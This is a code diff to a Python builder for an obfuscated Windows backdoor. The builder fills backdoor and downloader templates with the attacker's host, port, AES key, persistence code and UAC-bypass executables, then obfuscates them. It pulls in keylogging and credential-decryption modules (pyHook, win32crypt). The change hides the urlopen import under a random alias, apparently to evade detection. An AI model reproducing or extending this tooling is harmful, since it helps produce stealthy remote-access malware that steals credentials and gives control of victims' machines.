@@ -111,7 +111,7 @@ pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, key2, iv, secretkey = randKey(32), randKey(32), randKey(16), randKey(32)
-be64var, bd64var, AESvar, envvar, bz2var = randVar(), randVar(), randVar(), randVar(), randVar()
+be64var, bd64var, AESvar, envvar, bz2var, urlvar = randVar(), randVar(), randVar(), randVar(), randVar(), randVar()
 triplequote = "'" * 3
 lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
 junkvar = randVar()
@@ -140,19 +140,19 @@ with open('base64/64', 'rb') as exe64:
 
 if args.obfuscate:
 	with open('stubs/backdoor_obfs.py', 'rb') as finalbackdoor:
-		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000))
+		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000)).replace('***URLO***', urlvar)
 	with open('tempobfs.py', 'wb') as o:
 		o.write(readyscript)
 	obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	readyscript = obstime.stdout.read()
 	os.remove('tempobfs.py')
-	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from os import getenv as %s' % (envvar), 'from bz2 import decompress as %s' % (bz2var)]
+	myendings = ['from urllib2 import urlopen as %s' % (urlvar), 'from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from os import getenv as %s' % (envvar), 'from bz2 import decompress as %s' % (bz2var)]
 else:
 	with open('stubs/backdoor.py', 'rb') as finalbackdoor:
-		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
-	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from bz2 import decompress as %s' % (bz2var)]
+		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***URLO***', urlvar)
+	myendings = ['from urllib2 import urlopen as %s' % (urlvar), 'from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var), 'from bz2 import decompress as %s' % (bz2var)]
 
-myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
+myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
 mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
 
 if args.proxy:
@@ -184,7 +184,7 @@ else:
 	dlf = 'stubs/downloader_cust.py'
 
 with open(dlf, 'rb') as dl:
-	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var)
+	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar)
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
